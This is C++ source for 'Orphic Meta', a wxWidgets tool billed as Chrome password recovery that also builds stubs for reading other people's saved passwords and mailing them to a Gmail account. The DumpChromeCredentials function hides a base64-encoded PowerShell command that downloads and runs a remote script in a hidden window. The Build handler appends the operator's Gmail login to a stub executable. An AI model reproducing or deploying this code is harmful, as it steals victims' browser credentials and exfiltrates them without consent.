#include "testMain.h"
#include "base64.h"
#include <wx/msgdlg.h>
#include <windows.h>
#include <string>
#include <sstream>
#include <fstream>

//(*InternalHeaders(testDialog)
#include <wx/font.h>
#include <wx/intl.h>
#include <wx/settings.h>
#include <wx/string.h>
//*)

//helper functions
enum wxbuildinfoformat {
    short_f, long_f };

wxString wxbuildinfo(wxbuildinfoformat format)
{
    wxString wxbuild(wxVERSION_STRING);

    if (format == long_f )
    {
#if defined(__WXMSW__)
        wxbuild << _T("-Windows");
#elif defined(__UNIX__)
        wxbuild << _T("-Linux");
#endif

#if wxUSE_UNICODE
        wxbuild << _T("-Unicode build");
#else
        wxbuild << _T("-ANSI build");
#endif // wxUSE_UNICODE
    }

    return wxbuild;
}

//(*IdInit(testDialog)
const long testDialog::ID_STATICBOX1 = wxNewId();
const long testDialog::ID_BUTTON1 = wxNewId();
const long testDialog::ID_BUTTON2 = wxNewId();
const long testDialog::ID_CHECKBOX1 = wxNewId();
const long testDialog::ID_TEXTCTRL1 = wxNewId();
const long testDialog::ID_STATICTEXT1 = wxNewId();
const long testDialog::ID_BUTTON3 = wxNewId();
const long testDialog::ID_STATICBOX2 = wxNewId();
const long testDialog::ID_STATICTEXT3 = wxNewId();
const long testDialog::ID_TEXTCTRL3 = wxNewId();
const long testDialog::ID_STATICTEXT4 = wxNewId();
const long testDialog::ID_TEXTCTRL4 = wxNewId();
const long testDialog::ID_BUTTON4 = wxNewId();
//*)

BEGIN_EVENT_TABLE(testDialog,wxDialog)
    //(*EventTable(testDialog)
    //*)
END_EVENT_TABLE()

testDialog::testDialog(wxWindow* parent,wxWindowID id)
{
    //(*Initialize(testDialog)
    Create(parent, wxID_ANY, _("OrphicMETA"), wxDefaultPosition, wxDefaultSize, wxDEFAULT_DIALOG_STYLE, _T("wxID_ANY"));
    SetClientSize(wxSize(368,245));
    StaticBox1 = new wxStaticBox(this, ID_STATICBOX1, _("OrphicMeta"), wxPoint(0,0), wxSize(368,280), 0, _T("ID_STATICBOX1"));
    Button1 = new wxButton(this, ID_BUTTON1, _("Quit"), wxPoint(280,216), wxDefaultSize, 0, wxDefaultValidator, _T("ID_BUTTON1"));
    Button2 = new wxButton(this, ID_BUTTON2, _("Build"), wxPoint(120,216), wxDefaultSize, 0, wxDefaultValidator, _T("ID_BUTTON2"));
    msgbox = new wxCheckBox(this, ID_CHECKBOX1, _("Message Box"), wxPoint(8,24), wxDefaultSize, 0, wxDefaultValidator, _T("ID_CHECKBOX1"));
    msgbox->SetValue(false);
    msg = new wxTextCtrl(this, ID_TEXTCTRL1, _("Orphic Meta was here!"), wxPoint(72,48), wxSize(280,23), 0, wxDefaultValidator, _T("ID_TEXTCTRL1"));
    msg->Disable();
    msg->SetForegroundColour(wxSystemSettings::GetColour(wxSYS_COLOUR_HIGHLIGHT));
    wxFont msgFont(10,wxFONTFAMILY_MODERN,wxFONTSTYLE_NORMAL,wxFONTWEIGHT_BOLD,false,_T("Courier New"),wxFONTENCODING_DEFAULT);
    msg->SetFont(msgFont);
    StaticText1 = new wxStaticText(this, ID_STATICTEXT1, _("Message "), wxPoint(16,48), wxDefaultSize, 0, _T("ID_STATICTEXT1"));
    Button3 = new wxButton(this, ID_BUTTON3, _("About"), wxPoint(200,216), wxDefaultSize, 0, wxDefaultValidator, _T("ID_BUTTON3"));
    StaticBox2 = new wxStaticBox(this, ID_STATICBOX2, _("Email"), wxPoint(8,80), wxSize(344,128), 0, _T("ID_STATICBOX2"));
    StaticText3 = new wxStaticText(this, ID_STATICTEXT3, _("Gmail"), wxPoint(56,112), wxDefaultSize, 0, _T("ID_STATICTEXT3"));
    gmail = new wxTextCtrl(this, ID_TEXTCTRL3, wxEmptyString, wxPoint(96,104), wxSize(232,32), 0, wxDefaultValidator, _T("ID_TEXTCTRL3"));
    gmail->SetForegroundColour(wxSystemSettings::GetColour(wxSYS_COLOUR_HOTLIGHT));
    wxFont gmailFont(10,wxFONTFAMILY_MODERN,wxFONTSTYLE_NORMAL,wxFONTWEIGHT_BOLD,false,_T("Courier New"),wxFONTENCODING_DEFAULT);
    gmail->SetFont(gmailFont);
    StaticText4 = new wxStaticText(this, ID_STATICTEXT4, _("Password  "), wxPoint(40,160), wxDefaultSize, 0, _T("ID_STATICTEXT4"));
    passw = new wxTextCtrl(this, ID_TEXTCTRL4, wxEmptyString, wxPoint(96,152), wxSize(232,32), 0, wxDefaultValidator, _T("ID_TEXTCTRL4"));
    passw->SetForegroundColour(wxSystemSettings::GetColour(wxSYS_COLOUR_HOTLIGHT));
    wxFont passwFont(10,wxFONTFAMILY_MODERN,wxFONTSTYLE_NORMAL,wxFONTWEIGHT_BOLD,false,_T("Courier New"),wxFONTENCODING_DEFAULT);
    passw->SetFont(passwFont);
    Button4 = new wxButton(this, ID_BUTTON4, _("View Your Chrome Passwords"), wxPoint(176,16), wxDefaultSize, 0, wxDefaultValidator, _T("ID_BUTTON4"));
    FileDialog1 = new wxFileDialog(this, _("Select file"), wxEmptyString, wxEmptyString, _("*.exe"), wxFD_SAVE, wxDefaultPosition, wxDefaultSize, _T("wxFileDialog"));

    Connect(ID_BUTTON1,wxEVT_COMMAND_BUTTON_CLICKED,(wxObjectEventFunction)&testDialog::OnButton1Click);
    Connect(ID_BUTTON2,wxEVT_COMMAND_BUTTON_CLICKED,(wxObjectEventFunction)&testDialog::OnButton2Click);
    Connect(ID_CHECKBOX1,wxEVT_COMMAND_CHECKBOX_CLICKED,(wxObjectEventFunction)&testDialog::OnCheckBox1Click);
    Connect(ID_BUTTON3,wxEVT_COMMAND_BUTTON_CLICKED,(wxObjectEventFunction)&testDialog::OnAbout);
    Connect(ID_BUTTON4,wxEVT_COMMAND_BUTTON_CLICKED,(wxObjectEventFunction)&testDialog::OnButton4Click);
    Connect(wxID_ANY,wxEVT_INIT_DIALOG,(wxObjectEventFunction)&testDialog::OnInit);
    //*)
}

std::string readFileContents(const char* file){
	std::stringstream stream;
	std::ifstream outfile(file);
	if(outfile.is_open()){
		stream << outfile.rdbuf();
		return stream.str();
	} else {
		stream << file << " not found : " << GetLastError();
		return stream.str();
	}
}


std::string ExecuteOutFile(const char* command, const char* output_filename)
{
	char cmd[500];
	memset(cmd, '\0', 500);
	snprintf(cmd, 500, "cmd.exe /c powershell.exe -command %s > %s", command, output_filename);
	STARTUPINFOA sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	if(CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
		WaitForSingleObject(pinfo.hProcess, INFINITE);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}
	return readFileContents(output_filename);
}




std::string DumpChromeCredentials()
{
	std::ofstream ifError;
	std::string Payload = "ImlleCAoaXdyIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9xdWFudHVtY29yZS90ZXN0L21hc3Rlci9vcnBoaWMucHMxKSB8IENvbnZlcnRUby1Dc3Y7Ig==";
	std::string b64decode = base64_decode(Payload);
	ExecuteOutFile(b64decode.c_str(), "orphic_meta");

	if(readFileContents("orphic_meta").find("FullyQualifiedErrorId") != std::string::npos)
	{
		ifError.open("orphic_meta", std::ofstream::out | std::ofstream::trunc);
		if(ifError.is_open()){
			ifError << "No Passwords found / Chrome not installed." << std::endl;
			ifError.close();
		}
	}

	return readFileContents("orphic_meta");

}

void replaceAll( std::string &s, const std::string &search, const std::string &replace ) {
	for( size_t pos = 0; ; pos += replace.length() ) {
		// Locate the substring to replace
		pos = s.find( search, pos );
		if( pos == std::string::npos ) break;
		// Replace by erasing and inserting
		s.erase( pos, search.length() );
		s.insert( pos, replace );
	}
}

testDialog::~testDialog()
{
    //(*Destroy(testDialog)
    //*)
}

void testDialog::OnQuit(wxCommandEvent& event)
{
    Close();
}

void testDialog::OnAbout(wxCommandEvent& event)
{
    wxString msg = "Orphic Meta Chrome Password Recovery\n\nThis Application can be used to view your Own or someone else's Google Chrome Saved Passwords and receiving them in Gmail. Use it wisely.\n\nBy QuantumCore\nhttps://quantumcored.com\n\nThe Author is not responsible for any misuse or damage caused by the Program.";
    wxMessageBox(msg, _("Orphic META About"));
}

void testDialog::OnButton1Click(wxCommandEvent& event)
{
    Close();
}

void testDialog::OnCheckBox1Click(wxCommandEvent& event)
{
    if(msgbox->GetValue() == true)
    {
        msg->Enable();
    } else {
        msg->Disable();
    }
}

void testDialog::OnButton4Click(wxCommandEvent& event)
{
    std::string passwords = DumpChromeCredentials();
    replaceAll(passwords, "#TYPE System.Object", "Your Google Chrome Saved Passwords\n");
    replaceAll(passwords, ",", " - ");
    wxString msg(passwords.c_str(), wxConvUTF8);
    wxMessageBox(msg, _("Your Chrome Passwords"));
    remove("orphic_meta");
}


void copyf(const char* source, const char* destination){
    std::ifstream  src(source, std::ios::binary);
    std::ofstream  dst(destination, std::ios::binary);
    dst << src.rdbuf();
}

void testDialog::OnInit(wxInitDialogEvent&){}

void testDialog::OnButton2Click(wxCommandEvent& event)
{
    std::ofstream outfile; std::ostringstream err;
    wxString wxstrEmail = gmail->GetValue();
    wxString wxstrPassword = passw->GetValue();
    if(wxstrEmail != "" && wxstrPassword != "")
    {
        std::string msgboxmsg;
        std::string final_value;
        if(msgbox->GetValue() == true)
        {
            msgboxmsg = std::string(msg->GetValue().mb_str());
        } else {
            msgboxmsg = "0";
        }
        final_value = std::string(wxstrEmail.mb_str()) + "-" + std::string(wxstrPassword.mb_str()) + "-" + msgboxmsg;
        int res = FileDialog1->ShowModal();
        if(res == wxID_OK)
        {
            std::string filepath = std::string(FileDialog1->GetPath().mbc_str());
            copyf("orphic_c", filepath.c_str());
            outfile.open(filepath.c_str(), std::ios::app | std::ios::binary);
            if(outfile.is_open())
            {
                outfile << "\n\n";
                outfile << final_value.c_str();
                outfile.close();
                wxMessageBox("Built stub at : " + FileDialog1->GetPath() + "\nOnly install where you have permission to do so!\nEmail : " + wxstrEmail + "\nPassword : " + wxstrPassword + "\nMessage Box : " + msg->GetValue(), _("Build Success"));
            } else {
                err << "Error : " << GetLastError();
                wxString ermsg(err.str());
                wxMessageBox(ermsg);
            }

        }
    } else {
        wxMessageBox(_("One or more fields are empty!"), _("Error Building"));
    }

}
